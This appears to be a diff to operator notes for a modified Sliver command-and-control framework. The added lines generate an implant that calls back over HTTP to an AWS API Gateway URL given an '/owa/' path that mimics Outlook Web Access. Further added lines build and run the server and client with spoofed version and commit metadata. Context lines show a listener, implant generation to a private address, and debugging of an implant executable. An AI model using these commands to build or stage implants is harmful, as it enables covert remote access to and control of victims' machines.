@@ -12,6 +12,9 @@ Payload
 http -l 8080
 generate --http http://172.20.10.14:8080 -d --skip-symbols
 
+generate --http https://rhm5pq30wg.execute-api.us-east-1.amazonaws.com/owa/ --skip-symbols
+
+
 
 
 dlv exec --api-version 2 --headless --listen 172.20.10.13:5555 --log .\SAFE_CANVAS.exe
@@ -180,3 +183,16 @@ implant/sliver/handlers/handlers_windows.go
 protobuf/sliverpb/constants.go
 
 
+Running the server:
+
+cd //SliverX/
+make
+go run -ldflags "-X github.com/bishopfox/sliver/client/version.Version=1.1.2 -X github.com/bishopfox/sliver/client/version.CompiledAt=Never -X github.com/bishopfox/sliver/client/version.GithubReleasesURL=github.com -X github.com/bishopfox/sliver/client/version.GitCommit=aabbcc -X github.com/bishopfox/sliver/client/version.GitDirty=Dirty" -tags osusergo,netgo,go_sqlite,server ./server/main.go
+go run -ldflags "-X github.com/bishopfox/sliver/client/version.Version=1.0.0 -X github.com/bishopfox/sliver/client/version.CompiledAt=November -X github.com/bishopfox/sliver/client/version.GithubReleasesURL=github.com -X github.com/bishopfox/sliver/client/version.GitCommit=HostFileChanger -X github.com/bishopfox/sliver/client/version.GitDirty=RedTeam" -tags osusergo,netgo,go_sqlite,server ./server/main.go
+
+to build:
+server
+go build -ldflags "-X github.com/bishopfox/sliver/client/version.Version=1.0.0 -X github.com/bishopfox/sliver/client/version.CompiledAt=November -X github.com/bishopfox/sliver/client/version.GithubReleasesURL=github.com -X github.com/bishopfox/sliver/client/version.GitCommit=HostFileChanger -X github.com/bishopfox/sliver/client/version.GitDirty=RedTeam" -tags osusergo,netgo,go_sqlite,server ./server/main.go
+
+client
+go build -ldflags "-X github.com/bishopfox/sliver/client/version.Version=1.0.0 -X github.com/bishopfox/sliver/client/version.CompiledAt=November -X github.com/bishopfox/sliver/client/version.GithubReleasesURL=github.com -X github.com/bishopfox/sliver/client/version.GitCommit=HostFileChanger -X github.com/bishopfox/sliver/client/version.GitDirty=RedTeam" -tags osusergo,netgo,go_sqlite,server ./client/main.go
